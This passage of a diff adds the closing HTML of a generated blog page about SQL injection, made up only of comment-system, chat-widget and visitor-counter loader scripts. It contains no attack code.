+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/'
+    this.page.identifier = '/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/'
+    this.page.title = 'sql注入系统学习'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
